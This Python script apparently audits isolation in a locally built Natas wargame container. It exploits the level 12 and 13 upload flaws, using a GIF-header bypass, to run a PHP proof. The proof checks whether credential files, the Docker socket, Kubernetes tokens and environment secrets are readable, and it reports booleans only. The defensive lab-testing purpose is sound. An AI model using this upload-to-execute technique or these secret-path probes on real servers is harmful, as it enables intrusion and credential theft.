#!/usr/bin/env python3
"""Authorized synthetic-secret isolation audit for Natas 12 and 13 RCE.

This runs only against a locally created container. The PHP proof is uploaded
through each level's intended vulnerable upload route and returns boolean
boundary results only; it never returns a secret, credential, capability mask,
or host data.
"""

import base64
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request
import uuid


IMAGE = "cei-labs-natas-rce-isolation-audit"
CONTAINER = "cei-labs-natas-rce-isolation-audit"
SECRETS = {f"natas{level}": f"AUDIT_ONLY_NATAS_{level}_{uuid.uuid4().hex}" for level in range(1, 35)}
SECRETS["natas14final"] = f"AUDIT_ONLY_FINAL_{uuid.uuid4().hex}"
PORTS = {}


def run(*args, check=True, **kwargs):
    return subprocess.run(args, check=check, text=True, **kwargs)


def request(level, path="/", data=None, headers=None):
    password = "natas0" if level == 0 else SECRETS[f"natas{level}"]
    token = base64.b64encode(f"natas{level}:{password}".encode()).decode()
    request_headers = {"Authorization": f"Basic {token}"}
    request_headers.update(headers or {})
    req = urllib.request.Request(
        f"http://127.0.0.1:{PORTS[level]}{path}", data=data, headers=request_headers
    )
    with urllib.request.urlopen(req, timeout=5) as response:
        return response.read()


def multipart(level, filename, content):
    boundary = "----CEIRCEIsolation" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="submit"\r\n\r\n'
        "Upload File\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="uploadedfile"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
    return request(level, "/index.php", body, {"Content-Type": f"multipart/form-data; boundary={boundary}"})


def wait_for_target():
    for _ in range(30):
        try:
            request(12)
            return
        except (OSError, urllib.error.URLError, TimeoutError):
            time.sleep(1)
    raise RuntimeError("target did not become reachable")


def published_ports():
    bindings = json.loads(
        run("docker", "inspect", "--format", "{{json .NetworkSettings.Ports}}", CONTAINER, capture_output=True).stdout
    )
    published = {}
    for level in (12, 13):
        binding = bindings.get(f"{8000 + level}/tcp")
        if not isinstance(binding, list) or len(binding) != 1:
            raise RuntimeError(f"level {level} is not published to one loopback port")
        host_port = binding[0].get("HostPort")
        if not isinstance(host_port, str) or not host_port.isdigit():
            raise RuntimeError(f"level {level} has an invalid published port")
        published[level] = int(host_port)
    return published


def proof(level):
    # These checks run inside the Apache/PHP request process. They perform no
    # shell execution and intentionally serialize booleans, not protected data.
    php = rb'''<?php
function readable($path) { return @file_get_contents($path) !== false; }
$env = @file_get_contents('/proc/self/environ');
$status = @file_get_contents('/proc/self/status');
$cap_eff = 0;
if (preg_match('/^CapEff:\s*([0-9a-f]+)/mi', $status, $match)) {
    $cap_eff = hexdec($match[1]);
}
$docker = @stream_socket_client('unix:///var/run/docker.sock', $errno, $errstr, 1) !== false;
echo json_encode(array(
    'nonadjacent_webpass' => readable('/etc/natas_webpass/natas1'),
    'runtime_secret_file' => readable('/var/www/natas/natas14/next_password.php'),
    'runtime_secret_env' => strpos($env, 'LEVEL_SECRETS=') !== false,
    'mariadb_credentials' => readable('/etc/cei-labs/natas-db/natas14.php'),
    'other_identity_capability' => ($cap_eff & ((1 << 6) | (1 << 7))) !== 0,
    'docker_host_control' => $docker,
    'cross_team_materials' => readable('/run/secrets') || readable('/var/run/secrets/kubernetes.io/serviceaccount/token')
));
?>'''
    filename = f"isolation-{uuid.uuid4().hex}.php"
    content = (b"GIF89a" if level == 13 else b"") + php
    multipart(level, filename, content)
    response = request(level, f"/uploads/{filename}")
    # Level 13 deliberately preserves GIF bytes before PHP output.
    result = json.loads(response[response.index(b"{"):].decode())
    if not isinstance(result, dict) or not all(isinstance(value, bool) for value in result.values()):
        raise RuntimeError(f"level {level} returned an invalid audit response")
    return result


def main():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    run("docker", "build", "--tag", IMAGE, "targets/natas", cwd=root)
    run("docker", "rm", "--force", CONTAINER, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ports = [item for level in (12, 13) for item in ("--publish", f"127.0.0.1::{8000 + level}")]
    try:
        run("docker", "run", "--detach", "--name", CONTAINER, "--env", f"LEVEL_SECRETS={json.dumps(SECRETS)}", *ports, IMAGE, stdout=subprocess.DEVNULL)
        PORTS.update(published_ports())
        wait_for_target()
        failures = []
        for level in (12, 13):
            for boundary, exposed in proof(level).items():
                if exposed:
                    failures.append(f"level {level}: {boundary}")
        if failures:
            print("NATAS_RCE_ISOLATION_FAILED")
            for failure in failures:
                print(failure)
            return 1
        print("NATAS_RCE_ISOLATION_OK")
        return 0
    finally:
        run("docker", "rm", "--force", CONTAINER, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError, subprocess.CalledProcessError, urllib.error.URLError, json.JSONDecodeError) as error:
        print(f"NATAS_RCE_ISOLATION_ERROR: {error}", file=sys.stderr)
        raise SystemExit(2)
